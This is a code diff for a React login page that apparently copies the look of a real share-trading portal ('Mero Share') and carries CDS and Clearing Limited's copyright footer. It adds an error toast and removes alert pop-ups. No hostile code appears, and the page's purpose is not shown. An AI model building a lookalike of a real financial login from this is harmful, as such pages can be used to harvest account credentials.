@@ -8,6 +8,8 @@ import {
   Landmark,
   User,
   LockOpen,
+  ShieldAlert,
+  X,
 } from "lucide-react";
 
 import { BsFillExclamationTriangleFill } from "react-icons/bs";
@@ -20,14 +22,16 @@ export default function LoginPage() {
   const [password, setPassword] = useState("");
   const [loading, setLoading] = useState(false);
   const [attemptedSubmit, setAttemptedSubmit] = useState(false);
+  const [errorMessage, setErrorMessage] = useState<string | null>(null);
   const router = useRouter();
 
   async function handleLogin(e: React.FormEvent<HTMLFormElement>) {
     e.preventDefault();
     setAttemptedSubmit(true);
+    setErrorMessage(null);
 
     if (!dp || !username || !password) {
-      return; // Stop execution and display the warning icons
+      return; // Stop execution and display the warning icons on empty fields
     }
 
     setLoading(true);
@@ -42,14 +46,13 @@ export default function LoginPage() {
       const data = await response.json();
 
       if (!response.ok) {
-        alert(data.error || "Login failed.");
+        setErrorMessage(data.error || "Username or password invalid.");
       } else {
-        alert("Login successful!");
         router.push("/dashboard");
       }
     } catch (err) {
       console.error(err);
-      alert("An error occurred during login. Please try again.");
+      setErrorMessage("Username or password invalid.");
     } finally {
       setLoading(false);
     }
@@ -66,11 +69,10 @@ export default function LoginPage() {
     fontFamily: "var(--font-roboto-condensed), 'Roboto Condensed', sans-serif",
     fontSize: "14px",
     paddingLeft: "10px",
-    paddingRight: "35px", // Extra space for the warning icon
+    paddingRight: "35px",
     outline: "none",
   };
 
-  // Label styling matching DevTools (12.8px, #FAFAFA)
   const labelStyle: React.CSSProperties = {
     fontFamily: "var(--font-roboto-condensed), 'Roboto Condensed', sans-serif",
     fontSize: "12.8px",
@@ -79,7 +81,7 @@ export default function LoginPage() {
   };
 
   return (
-    <div className="min-h-screen bg-[#333a56] flex flex-col items-center justify-center p-4 select-none">
+    <div className="min-h-screen bg-[#333a56] flex flex-col items-center justify-center p-4 select-none relative">
       <main
         className="w-full bg-[#333a56] shadow-[0_8px_24px_rgba(0,0,0,.38)] -translate-y-3"
         style={{
@@ -138,10 +140,10 @@ export default function LoginPage() {
                 autoComplete="username"
               />
               {attemptedSubmit && !username && (
-                  <BsFillExclamationTriangleFill
-                      size={15}
-                      className="absolute right-[11px] top-1/2 -translate-y-1/2 text-[#F3B300]"
-                  />
+                <BsFillExclamationTriangleFill
+                  size={15}
+                  className="absolute right-[11px] top-1/2 -translate-y-1/2 text-[#F3B300]"
+                />
               )}
             </div>
           </div>
@@ -168,10 +170,10 @@ export default function LoginPage() {
                 autoComplete="current-password"
               />
               {attemptedSubmit && !password && (
-                  <BsFillExclamationTriangleFill
-                      size={15}
-                      className="absolute right-[11px] top-1/2 -translate-y-1/2 text-[#F3B300]"
-                  />
+                <BsFillExclamationTriangleFill
+                  size={15}
+                  className="absolute right-[11px] top-1/2 -translate-y-1/2 text-[#F3B300]"
+                />
               )}
             </div>
           </div>
@@ -186,7 +188,7 @@ export default function LoginPage() {
                 fontFamily: "var(--font-roboto-condensed), 'Roboto Condensed', sans-serif",
               }}
             >
-              {loading ? "Logging in..." : "Login"}
+              {loading ? "Processing" : "Login"}
             </button>
           </div>
 
@@ -214,6 +216,29 @@ export default function LoginPage() {
       >
         © 2026 CDS and Clearing Limited. All Rights Reserved
       </footer>
+
+      {/* Error Toast Notification Banner matching Mero Share style */}
+      {errorMessage && (
+        <div className="fixed bottom-6 right-6 z-50 flex items-center justify-between bg-[#d9534f] text-white px-4 py-3 rounded shadow-lg min-w-[300px] max-w-[400px]">
+          <div className="flex items-center gap-3">
+            <ShieldAlert size={22} className="shrink-0 text-white" />
+            <span
+              className="text-[14px]"
+              style={{
+                fontFamily: "var(--font-roboto-condensed), 'Roboto Condensed', sans-serif",
+              }}
+            >
+              {errorMessage}
+            </span>
+          </div>
+          <button
+            onClick={() => setErrorMessage(null)}
+            className="text-white hover:text-gray-200 ml-4 focus:outline-none cursor-pointer"
+          >
+            <X size={18} />
+          </button>
+        </div>
+      )}
     </div>
   );
 }
